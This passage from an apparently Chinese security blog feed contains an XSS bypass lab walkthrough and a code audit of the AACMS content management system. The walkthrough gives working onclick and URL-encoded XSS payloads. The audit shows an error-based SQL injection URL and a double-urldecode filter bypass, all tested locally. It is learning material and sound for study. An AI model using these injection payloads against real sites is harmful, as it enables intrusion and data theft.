href="https://www.php.net/manual/zh/soapclient.call.php">https://www.php.net/manual/zh/soapclient.call.php</a></p><p><a href="https://article.itxueyuan.com/nWEn9q">https://article.itxueyuan.com/nWEn9q</a></p><p><a href="http://t.zoukankan.com/tr1ple-p-11156279.html">http://t.zoukankan.com/tr1ple-p-11156279.html</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123486896">https://blog.csdn.net/qq_51295677/article/details/123486896</a></p><p><a href="https://www.jb51.net/article/242523.htm">https://www.jb51.net/article/242523.htm</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-491289.html">https://www.php.cn/php-weizijiaocheng-491289.html</a></p><p><a href="https://blog.csdn.net/xiaolong22333/article/details/116092578">https://blog.csdn.net/xiaolong22333/article/details/116092578</a></p><p><a href="https://paper.seebug.org/680/#22-demo">https://paper.seebug.org/680/#22-demo</a></p><p><a href="https://www.php.net/manual/en/class.phar.php">https://www.php.net/manual/en/class.phar.php</a></p><p><a href="https://blog.csdn.net/Askshhbs/article/details/124404971">https://blog.csdn.net/Askshhbs/article/details/124404971</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_bypass靶场</title>
    <link href="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS-bypass靶场"><a href="#XSS-bypass靶场" class="headerlink" title="XSS bypass靶场"></a>XSS bypass靶场</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>偶然时间看到一个xss bypass的靶场，因为正在对一个xss的过滤规则进行绕过，所以顺手玩了一下，故记录一手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/moeinfatehi/xss_vulnerability_challenges// 项目地址<br></code></pre></td></tr></table></figure><h4 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h4><p>这关没什么，前端js的限制，可以禁用掉浏览器的js，也可以直接抓包过，但个人推荐还是直接抓包过，因为禁用js的话可能会导致页面加载出现一些小问题</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h4><p>这一关就是简单的进行构造一下标签</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/2.png"></p><p>可以看到输入在<code>input</code>标签中体现出来，所以可以直接构造<code>payload</code>:<code>11&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/3.png"></p><h4 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h4><p>这一关考的应该是js的基础，首先输入个111</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/4.png"></p><p>查看网页源码能够发现这个<code>111</code>被存储为变量name的值</p><p>但可以将这个声明变量的语句进行闭合，然后直接执行<code>payload</code>:<code>111&quot;;alert(/xxx/);//</code></p><p>注意需要注释</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/5.png"></p><p>当前也可以利用一些其他函数，比如<code>eval()</code>、<code>new Function()</code>等</p><p><code>alert(/xxx/)&quot;;eval(name);//</code></p><h4 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h4><p>这关，已经直白的说了不能用<code>&lt;script&gt;</code>标签，那就换个标签，然后就是前端限制了，没啥的</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="XSS5"><a href="#XSS5" class="headerlink" title="XSS5"></a>XSS5</h4><p>这关禁用了<code>&lt; &gt;</code>，禁用了尖括号就不好构造标签了，所以可以尝试使用编码，优先想到的就是url编码</p><p>把尖括号更改为url编码的形式，然后就可以直接过了</p><p><code>payload</code>:<code>111&quot; onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="XSS6"><a href="#XSS6" class="headerlink" title="XSS6"></a>XSS6</h4><p>这关过滤了双引号<code>&quot;</code></p><p>但好像没太理解作者的意思，输入双引号之后，会进行转义，变成<code>\&quot;</code>，而双引号又能够正常进行加载执行</p><p>所以可以直接<code>111&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss6源码</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);</span><br>    <span class="hljs-variable">$input</span> = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// Failure is an option</span><br>    <span class="hljs-comment">// Bypasses double encoding attacks</span><br>    <span class="hljs-comment">// &lt;script&gt;alert(0)&lt;/script&gt;</span><br>    <span class="hljs-comment">// %3Cscript%3Ealert%280%29%3C%2Fscript%3E</span><br>    <span class="hljs-comment">// %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E</span><br>    <span class="hljs-variable">$input</span> = urldecode(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>感觉有点出乎作者的想法，看样子作者本身是想要让使用编码或者一些没有双引号的<code>payload</code>来过这里，结果不曾想双引号是能够直接加载成功的🤣</p><h4 id="XSS7"><a href="#XSS7" class="headerlink" title="XSS7"></a>XSS7</h4><p>这关过滤了双引号，一对尖括号，直接输入的话会返回html实体化编码的形式，但还是可以直接用url编码过</p><p><code>payload</code>:<code>111%22 onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/9.png"></p><h4 id="XSS8"><a href="#XSS8" class="headerlink" title="XSS8"></a>XSS8</h4><p>这关直接摆明，用的<code>htmlentities()</code>稍稍看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss8源码</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> htmlentities(<span class="hljs-variable">$data</span>, ENT_QUOTES);<span class="hljs-comment"># 编码双引号和单引号。</span><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmm😭，这个我觉着很安全</p><p>没有绝对的安全，其实就是菜</p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/10.png" style="zoom:60%;">]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-AACMS</title>
    <link href="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/"/>
    <url>/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。</p><h4 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>PHP5.2.17</p><p>MySQL5.7.26</p><p>Apache2.4.39</p><h5 id="程序安装"><a href="#程序安装" class="headerlink" title="程序安装"></a>程序安装</h5><p>先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png"></p><p>安装该cms，配置好网站之后直接访问/install/index.php即可，有个地方需要注意的是：数据库默认字符集为GBK，这就可能导致存在宽字节注入</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png"></p><h5 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png"></p><p>先包含class_core.php，然后调用该文件中的两个方法，最后包含文章模板目录下的index文件</p><p>跟进class_core.php文件查看，先是定义了一个常量，后定义了五个类，找到刚刚index.php中调用的方法</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// 实例化了自己本身的对象：单例模式</span><br><span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再看<code>init()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 调用该类中的一些其他方法</span><br><br><span class="hljs-keyword">$this</span>-&gt;_init_db();<br><span class="hljs-keyword">$this</span>-&gt;_init_memory();<br><span class="hljs-keyword">$this</span>-&gt;_init_session();<span class="hljs-comment">// 初始化session</span><br><span class="hljs-keyword">$this</span>-&gt;_init_setting();<span class="hljs-comment">//</span><br><span class="hljs-keyword">$this</span>-&gt;_init_misc();<span class="hljs-comment">//初始化时区</span><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_db</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 创建数据库连接</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql&#x27;</span>;<br><span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>])) &#123;<span class="hljs-comment">// config中根本没有该内容，所以无法进入</span><br><span class="hljs-keyword">require_once</span> libfile(<span class="hljs-string">&#x27;class/mysql_slave&#x27;</span>);<br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql_slave&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;db = &amp; DB::object(<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;set_config(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>]);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;connect();<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里引入了$_G这个全局变量，并且根据该全局变量的值进行了一个判断，而PHP中并没有给出这个全局变量，并且在前面也没有对该变量的值进行一个定义操作，所以，需要寻找一下该全局变量是从哪里来的。</p><p>PHP在实例化类时，会调用构造方法，而构造方法分两种，一种是__construct 魔术方法；另一种是将成员方法定义为类名。这里没有使用魔术方法，所以肯定是直接使用的与类名相同的成员方法，找到该方法，跟进并简答分析每一个方法的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 看名字都知道是一堆初始化</span><br><span class="hljs-keyword">$this</span>-&gt;_init_env();<span class="hljs-comment">// 屏蔽错误信息、设置session、设置XXF头，对$_G进行一定的赋值</span><br><span class="hljs-keyword">$this</span>-&gt;_init_config();<span class="hljs-comment">// 将配置文件全部写入到$_G中</span><br><span class="hljs-keyword">$this</span>-&gt;_init_input();<span class="hljs-comment">// 将GET\POST\COOKIE\FILE等输入全部进行魔术引号过滤</span><br><span class="hljs-keyword">$this</span>-&gt;_init_output();<span class="hljs-comment">// 定义OB缓冲机制，即返回包相关内容</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到<code>init()</code>方法中调用的<code>__init_db()</code>方法，跟进，确定该方法是用来建立数据库链接，/config/config_global.php中读取相关配置信息，然后进行简历数据库链接</p><p>跟进<code>_init_memory()</code>方法，发现是初始化memory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_memory</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 初始化memory</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-keyword">$this</span>-&gt;mem = <span class="hljs-keyword">new</span> memory();<span class="hljs-comment">// 实例化memory类</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;init_memory) &#123;<br><span class="hljs-keyword">$this</span>-&gt;mem-&gt;init(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;memory&#x27;</span>]);<br>&#125;<br><span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;memory&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;mem-&gt;type;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>后面的也都是一些初始化操作，所以回到index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);<br></code></pre></td></tr></table></figure><p>跟进<code>template()</code>,其实就是将数据库中的文章显示在index.php中</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png"></p><p>index.php分析完了，结果是没有任何发现，但对该CMS有了一定的了解。继续分析其他的入口函数</p><h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png"></p><p>跟随大哥的思路，看一下article_view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;<span class="hljs-comment">// 该值前面定义过，为True</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);<span class="hljs-comment">// 获取aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);<span class="hljs-comment">// 根据aid返回文章</span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在数据库中插入一条记录，因为该表中的所有字段都不能为null，所以只能所有的都添加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms 代码审计&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;代码审计&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p>在浏览器中进行访问</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png"></p><p>从这里开看，如果在插入title和content时内容可控，则可能存在二次注入；比如执行如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png"></p><p>回到article.php，这里接收了一个aid，但是aid经过<code>intval()</code>的处理了，而<code>intval()</code>函数的返回变量 <code>var</code> 的 [integer]数值，所以导致无法实现注入；</p><h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png"></p><p>在没有登陆的状态下，默认是进入到admin_member.php中，并且根据operation的值跳入到指定模块中去</p><p>到这里，三个入口函数基本了解清楚，由于index.php和article.php没有什么内容，所以只能从admin.php处下手进行审计。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="发现的漏洞"><a href="#发现的漏洞" class="headerlink" title="发现的漏洞"></a>发现的漏洞</h5><h6 id="1-前台SQL注入"><a href="#1-前台SQL注入" class="headerlink" title="1.前台SQL注入"></a>1.前台SQL注入</h6><p>这里需要先在后台文章处添加一个栏目</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png"></p><p>然后再访问<a href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.php就能看到</a></p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png"></p><p>给<code>catid</code>参数加个单引号,页面爆出数据库错误</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //页面返回正常</span><br></code></pre></td></tr></table></figure><p>由此可以构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png"></p><p>这里由于是黑盒测试的，所以需要去回去看一下源码，看一下源码该漏洞是如何形成的，可以根据报错信息去寻找漏洞点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 漏洞位置位于/aacms/source/function/block/block.article.php 25-40行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; <span class="hljs-comment">// 传入catid,没有aid，所以直接进入else</span><br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>&#125;  <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;<span class="hljs-comment">// 采用直接拼接</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// 返回一个由数据元素组合成的字符串</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>&#125;<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br><span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>此处是因为对<code>$catid</code>直接拼接，并且该变量没有单引号进行保护</p><h5 id="复现的漏洞"><a href="#复现的漏洞" class="headerlink" title="复现的漏洞"></a>复现的漏洞</h5><h6 id="1-urldecode导致的注入漏洞"><a href="#1-urldecode导致的注入漏洞" class="headerlink" title="1.urldecode导致的注入漏洞"></a>1.<strong>urldecode导致的注入漏洞</strong></h6><p>漏洞位置 <code>\admin\admin_misc.php</code></p><p>这个漏洞产生的原因在于程序对于接受的GET参数再次进行了url解码，因为浏览器在向web应用发送参数时是已经进行了一次url解码，然后经过<code>daddslashes()</code>过滤，但程序内部再一次进行了url解码，就导致可以采用两次url编码来绕过<code>daddslashes()</code>，从而实现注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span 